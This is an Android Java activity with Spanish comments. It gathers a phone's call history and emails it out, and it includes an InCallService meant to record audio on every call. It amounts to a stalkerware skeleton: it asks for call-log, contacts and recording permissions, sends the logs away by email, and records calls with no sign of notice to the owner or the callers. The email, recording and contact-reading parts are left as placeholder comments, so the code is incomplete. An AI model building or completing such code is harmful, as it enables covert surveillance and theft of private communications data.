import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telecom.Call;
import android.telecom.InCallService;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

// ... (Importaciones para enviar correo electrónico, como JavaMail)

public class RegistroLlamadas extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 789;
    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ANSWER_PHONE_CALLS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS
    };

    private MediaRecorder mediaRecorder;
    private String archivoGrabacion;

    // ... (resto de tu actividad)

    private void solicitarPermisos() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!tienePermisos()) {
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
            } else {
                obtenerRegistroLlamadas();
            }
        } else {
            // En versiones anteriores a Marshmallow, los permisos se otorgan en la instalación
            obtenerRegistroLlamadas();
        }
    }

    private boolean tienePermisos() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                obtenerRegistroLlamadas();
            } else {
                // El usuario denegó los permisos
                Log.e("RegistroLlamadas", "Permisos denegados");
                // Aquí puedes mostrar un mensaje al usuario o tomar alguna acción
            }
        }
    }

    private void obtenerRegistroLlamadas() {
        ContentResolver contentResolver = getContentResolver();
        Uri uri = CallLog.Calls.CONTENT_URI;
        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        Cursor cursor = contentResolver.query(uri, projection, null, null, null);

        StringBuilder registroLlamadas = new StringBuilder();
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));

                String formattedDate = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(date));
                String callType = getCallType(type);

                registroLlamadas.append("Número: ").append(number).append("\n");
                registroLlamadas.append("Tipo: ").append(callType).append("\n");
                registroLlamadas.append("Fecha: ").append(formattedDate).append("\n");
                registroLlamadas.append("Duración: ").append(duration).append(" segundos\n");
                registroLlamadas.append("------------------------\n");
            } while (cursor.moveToNext());
            cursor.close();
        }

        // Aquí puedes obtener la lista de contactos y números

        // Envía la información por correo electrónico
        enviarCorreoElectronico(registroLlamadas.toString());
    }

    private String getCallType(String type) {
        switch (Integer.parseInt(type)) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Entrante";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Saliente";
            case CallLog.Calls.MISSED_TYPE:
                return "Perdida";
            default:
                return "Desconocido";
        }
    }

    // ... (Métodos para grabar audio, leer contactos y enviar el correo electrónico)

    // Clase interna para manejar llamadas y grabar audio
    @RequiresApi(api = Build.VERSION_CODES.M)
    public static class CallRecorderService extends InCallService {

        @Override
        public void onCallAdded(Call call) {
            super.onCallAdded(call);
            // Inicia la grabación de audio cuando se agrega una llamada
            iniciarGrabacion();
        }

        @Override
        public void onCallRemoved(Call call) {
            super.onCallRemoved(call);
            // Detiene la grabación de audio cuando se elimina una llamada
            detenerGrabacion();
        }

        private void iniciarGrabacion() {
            // ... (Implementa la lógica para iniciar la grabación de audio)
        }

        private void detenerGrabacion() {
            // ... (Implementa la lógica para detener la grabación de audio)
        }
    }
}
